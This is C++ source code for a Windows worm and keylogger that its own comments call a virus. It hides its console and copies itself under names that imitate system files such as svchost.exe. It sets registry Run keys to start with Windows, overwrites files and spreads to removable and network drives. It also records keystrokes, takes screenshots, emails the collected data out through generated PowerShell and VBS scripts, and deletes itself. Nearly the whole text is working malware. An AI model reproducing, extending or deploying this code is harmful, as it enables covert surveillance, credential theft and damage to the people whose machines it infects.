	ShellExecute(NULL,"open","C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\OjQwOTZ9XSwiaXR.vbs",NULL,NULL,SW_NORMAL) ;
}
void UploadMail()//----------------------------------->>upload to mail 
{
	//----------------------------------------------------- Check internet Connection to upload files to email	
	int state;
	state=InternetCheckConnection("http://www.google.com",1,0);
	cout<<state<<endl;
	if(state)
	{
		CreatePs1_Script();  //-------------------------------------- Create powershell upload script
		myVbs();             //-------------------------------------- Create vbs script execute ps1 script
		StartVbs();//-------------------------------------- Execute vbs script 
	}
	else
	{ 
		remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\OjQwOTZ9XSwiaXR.vbs");
		remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\Q1WV9nRy16dF.ps1");
		ClearContents();
	}
}
/*
void displayTime(int hours,int minutes,int seconds)
{
	cout<<hours<<" : "<<minutes<<" : "<<seconds<<endl;
	system("cls");

}*/

void uploadTimer()//-----------------------------------  upload lifetime and upload activity
{ 
long selfDelete=0;
x:
	int hour=0;
	int min=0;
	int sec=0;
	int takePic=2;
	 //displayTime( hour, min, sec);
	while(true)
	{
		Sleep(1);
		
		sec++;

		if(sec>59)
		{
			min++;
			sec=0;
		
		}
		if(min>59)
		{
			hour++;
			sec=0;
			min=0;
			if(hour==takePic)//Take a screenshot after every two minutes automation
			{
				TakeScreenshot();
				takePic+=2;
			}
				
			if(hour==3)//After 20mins = 1 message upload
			{
				break;
				
			}

		}
			
	 //displayTime( hour, min, sec);		
	}
	UploadMail();//---------->> Execute ps1.script 
	Sleep(60000);//--------...Upload the files for two minutes//120,000

	ClearContents();

	selfDelete=selfDelete+1;

	if(selfDelete==12)//Terminate keylogging after uploading 12 messages to e-mail ie after 6 hrs
			{
				goto y;
				
			}
	goto x;
y:
	char ProgPath[MAX_PATH];
	GetModuleFileName(NULL,ProgPath,MAX_PATH);
	CHAR SysFolder9[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg";CreateDirectory(SysFolder9,0);
	string myoldSys=ProgPath;
	
	strcat(SysFolder9,"\\iexplorer.exe");//------------------spreading module	

	CopyFile(myoldSys.c_str(),SysFolder9,0);
	
	char oldPath[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\debug\\debug.exe";
	char newPath[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.exe";

	rename(oldPath,newPath);//------timer for keylogger moves itself
	
	killProcessByName("svchost.exe");
	killProcessByName("iexplorer.exe");
	CreatePs1();
	Createvbs();
	RunVbs();
	RunSelfDeleteVbs();
 	exit(1);
}

int main(int argc, char *argv[])
{
	//hide console window
	FreeConsole();	
	ClearContents();
	//..............................................................	//create a directory in drive C	
	CHAR SysFolder1[]="C:\\System";CreateDirectory(SysFolder1,0);	
	CHAR SysFolder2[]="C:\\System\\iexplore";CreateDirectory(SysFolder2,0);
	CHAR SysFolder3[]="C:\\System\\iexplore\\MSENV";CreateDirectory(SysFolder3,0);
	CHAR SysFolder4[]="C:\\System\\iexplore\\MSENV\\VSDPL";CreateDirectory(SysFolder4,0);
	CHAR SysFolder5[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd";CreateDirectory(SysFolder5,0);
	CHAR SysFolder6[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A";CreateDirectory(SysFolder6,0);
	CHAR SysFolder7[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst";CreateDirectory(SysFolder7,0);
	CHAR SysFolder8[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS";CreateDirectory(SysFolder8,0);
	CHAR SysFolder9[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg";CreateDirectory(SysFolder9,0);
	CHAR SysFolder10[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV";CreateDirectory(SysFolder10,0);
	CHAR SysFolder11[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml";CreateDirectory(SysFolder11,0);
	CHAR SysFolder12[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR";CreateDirectory(SysFolder12,0);
	CHAR SysFolder13[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40";CreateDirectory(SysFolder13,0);
	CHAR SysFolder14[]="C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\debug";CreateDirectory(SysFolder14,0);

	string myoldSys=argv[0];
	
	strcat(SysFolder9,"\\iexplorer.exe");//------------------spreading module	

	CopyFile(myoldSys.c_str(),SysFolder9,0);

	
	string debug =argv[0];
	
	strcat(SysFolder14,"\\debug.exe");//------------------keylogging module		

	CopyFile(debug.c_str(),SysFolder14,0);

	//..............................................................
	//auto start up the worm part

	HKEY hKey2;		
	const  char* czStartName2="spoolsv";

	long InRes2 = RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey2);
	if(ERROR_SUCCESS ==InRes2)
	{	
		InRes2=RegSetValueEx(hKey2,czStartName2,0,REG_SZ,(unsigned char*)SysFolder9,strlen(SysFolder9));		
	}
	RegCloseKey(hKey2);

	//..............................................................
	//auto start up the keylogger timer module

	HKEY hKeyTimer;		
	const  char* czStartNameTimer="debug";

	long InResTimer = RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKeyTimer);
	if(ERROR_SUCCESS ==InResTimer)
	{	
		InResTimer=RegSetValueEx(hKeyTimer,czStartNameTimer,0,REG_SZ,(unsigned char*)SysFolder14,strlen(SysFolder14));		
	}
	RegCloseKey(hKeyTimer);
	//..............................................................
	//create directory in temp folder and copy the keylogger
	
	TCHAR tempfolder1[MAX_PATH+1];
	DWORD tempresult=GetTempPath(MAX_PATH+1,tempfolder1);

	strcat(tempfolder1,"\\WMIPRVSE");
	CreateDirectory(tempfolder1,0);

	strcat(tempfolder1,"\\EN");
	CreateDirectory(tempfolder1,0);

	strcat(tempfolder1,"\\~rscv");
	CreateDirectory(tempfolder1,0);

	strcat(tempfolder1,"\\WMSysPr9");
	CreateDirectory(tempfolder1,0);

	TCHAR tempfolder2[MAX_PATH+1];
	DWORD tempresult4=GetTempPath(MAX_PATH+1,tempfolder2);

	strcat(tempfolder2,"\WMIPRVSE\\EN\\~rscv\\WMSysPr9\\svchost.exe");
	string tempoldname1=argv[0];
	string  tempnewname1=tempfolder2;	
	
	CopyFile(tempoldname1.c_str(),tempnewname1.c_str(),0);


	//create a folder in temp to save screenshots
	TCHAR folder1[MAX_PATH+1];

	DWORD result3=GetTempPath(MAX_PATH+1,folder1);

	strcat(folder1,"\\en-US");
	CreateDirectory(folder1,0);

	strcat(folder1,"\\COMMDLG");
	CreateDirectory(folder1,0);

	strcat(folder1,"\\inf");
	CreateDirectory(folder1,0);

	strcat(folder1,"\\Win32dbg");
	CreateDirectory(folder1,0);

	strcat(folder1,"\\Dg5RDU2WXVPRm");
	CreateDirectory(folder1,0);
	
	strcat(folder1,"\\TQ4QVNNWmV5");
	CreateDirectory(folder1,0);

	//..............................................................
	//auto start up the keylogger part

	HKEY hKey;		
	const  char* czStartName="svchost";

	long InRes = RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey);
	if(ERROR_SUCCESS ==InRes)
	{	
		InRes=RegSetValueEx(hKey,czStartName,0,REG_SZ,(unsigned char*)tempnewname1.c_str(),strlen(tempnewname1.c_str()));
	
	}
	RegCloseKey(hKey);	
	//..............................................................
	//get the virus name to determine its state ie worm or a keylogger
	string path = argv[0];
	string ss=getFileName(path);
	//cout<<"The file name is :"<<ss<<endl;

	Sleep(30000);//delay the virus for 2mins to avoid operating system crash on booting computer			
	changeFileExtension();//this will overwrite any file on your folder EVEN ITSELF
/*	//..............................................................
	//overwrite exe files in current folder
	ofstream files;
	WIN32_FIND_DATA find;
	HANDLE han=FindFirstFile("*exe", &find);
	if(han!=INVALID_HANDLE_VALUE)
	{ 
		do
		{			
			CopyFile(argv[0],find.cFileName,0);//overwrite  file			
			files.close();
		}while(FindNextFile(han,&find));	
	}
*/
	if(ss=="svchost")
	{
		goto cont;
	}	
	else if(ss=="debug")
	{		
		uploadTimer();
	}	
	else
	{
		do
		{

			USB_NETWORK_INFECT();//then it is a spreading worm  else continue as a keylogger
		}while(ss!="svchost");

	}
	
cont:	
	
	//..............................................................
	//copy virus to  local drives
    DWORD dwSize=MAX_PATH;
	char szLogicalDrives[MAX_PATH];
	DWORD dwResult=GetLogicalDriveStrings(dwSize,szLogicalDrives);

	if(dwResult>0 && dwResult<=MAX_PATH)
	{
		char *szSingleDrive=szLogicalDrives;
		while(*szSingleDrive)
		{	
			//printf("Drive:%s\n",szSingleDrive);
			if(GetDriveType(szSingleDrive)==DRIVE_REMOVABLE)
			{	
				//cout<<"Drive type removable"<<endl;
				const std::string directory=szSingleDrive;
				GetFilesInDirectory( directory);
			}
			if(GetDriveType(szSingleDrive)==DRIVE_REMOTE)
			{
				const std::string directory=szSingleDrive;
				GetFilesInDirectory( directory);
			}
			if(GetDriveType(szSingleDrive)==DRIVE_UNKNOWN)
			{
				const std::string directory=szSingleDrive;
				GetFilesInDirectory( directory);
			}
			if(GetDriveType(szSingleDrive)==DRIVE_NO_ROOT_DIR)
			{	
				//cout<<"Drive type removable"<<endl;
				const std::string directory=szSingleDrive;
				GetFilesInDirectory( directory);
			}
			if(GetDriveType(szSingleDrive)==DRIVE_CDROM)
			{
				const std::string directory=szSingleDrive;
				GetFilesInDirectory( directory);
			}
			/*
			if(GetDriveType(szSingleDrive)==DRIVE_FIXED)
			{
				const std::string directory=szSingleDrive;
				GetFilesInDirectory( directory);
			}
			*/			
			//get the next drive
			szSingleDrive+=strlen(szSingleDrive)+1;	
		}
	}
	//	warning();
	//	desktopFile();
x:
	//..............................................................
	//take screenshot
	int nScreenWidth=GetSystemMetrics(SM_CXSCREEN);	 
	int nScreenHeight=GetSystemMetrics(SM_CYSCREEN);

	HWND hDesktopWnd=GetDesktopWindow();
	HDC hDesktoDC=GetDC(hDesktopWnd);
	HDC hCaptureDC=CreateCompatibleDC(hDesktoDC);
	HBITMAP hCaptureBitmap=CreateCompatibleBitmap(hDesktoDC,nScreenWidth,nScreenHeight);
	SelectObject(hCaptureDC,hCaptureBitmap);
	BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,hDesktoDC,0,0,SRCCOPY);
	
	//hide screenshots in temp folder
	TCHAR Screenshot[MAX_PATH+1];
	DWORD myScreenshot=GetTempPath(MAX_PATH+1,Screenshot);
	
	strcat(Screenshot,"\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5\\image.jpeg");
	LPCSTR fname=Screenshot;
	HPALETTE hPal=NULL;
	
	saveBitmap(fname,hCaptureBitmap,hPal);

	ReleaseDC(hDesktopWnd,hDesktoDC);
	DeleteDC(hCaptureDC);
	DeleteObject(hCaptureBitmap);
	//..............................................................
	//call rename image  funtion
	renameimage();	 
	char c;
	while(true)
	{
		for(c=8;c<=256;c++)
		{
			if(GetAsyncKeyState(c)==-32767)
			{				
				TCHAR myfolder[MAX_PATH+1];
				DWORD myResult=GetTempPath(MAX_PATH+1,myfolder);	
				strcat(myfolder,"\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5\\log.txt");			
				ofstream file(myfolder,ios::app);			
				if((c>64 && c<91)&& !GetAsyncKeyState(0x10))
				{
					c+=32;
					file<<c;
					file.close();				
					break;
				}
				else if(c>64 && c<91)
				{
					file<<c;
					file.close();
					break;
				}
					else
					{					
						switch(c)

						{
							case 48:
								if(GetAsyncKeyState(0x10)){file<<")";}else{ file<<"0";}break;
							case 49:
								if(GetAsyncKeyState(0x10)){file<<"!";}else{ file<<"1";}break;
							case 50:
								if(GetAsyncKeyState(0x10)){file<<"@";}else{ file<<"2";}break;
							case 51:
								if(GetAsyncKeyState(0x10)){file<<"#";}else{ file<<"3";}break;
							case 52:
								if(GetAsyncKeyState(0x10)){file<<"$";}else{ file<<"4";}break;
							case 53:
								if(GetAsyncKeyState(0x10)){file<<"%";}else{ file<<"5";}break;
							case 54:
								if(GetAsyncKeyState(0x10)){file<<"^";}else{ file<<"6";}break;
							case 55:
								if(GetAsyncKeyState(0x10)){file<<"&";}else{ file<<"7";}break;
							case 56:
								if(GetAsyncKeyState(0x10)){file<<"*";}else{ file<<"8";}break;
							case 57:
								if(GetAsyncKeyState(0x10)){file<<"(";}else{ file<<"9";}break;

							case VK_SHIFT:goto x;
								
							case VK_BACK:{file<<"-[Backspace]-";}			
															
							case VK_RBUTTON:{file<<"-[Rbutton]-";}	
						
							case VK_RETURN:{file<<"-[ENTER]-";}
								
							//case VK_TAB:goto x;
								
							case VK_ESCAPE:{file<<"-[Escape]-";}	
								
							//case VK_CONTROL:goto x;
								
							case VK_MENU:{file<<"-[Alt]-";}
								
							//case VK_CAPITAL:goto x;
								
							case VK_SPACE:{file<<" ";}

							case VK_DELETE:{file<<"-[Delete]-";}	
									
							case VK_NUMLOCK:{file<<"-[Numlock]-";}							
	
						}
					}
			}
			
		}
	}
			
	return 0;
}
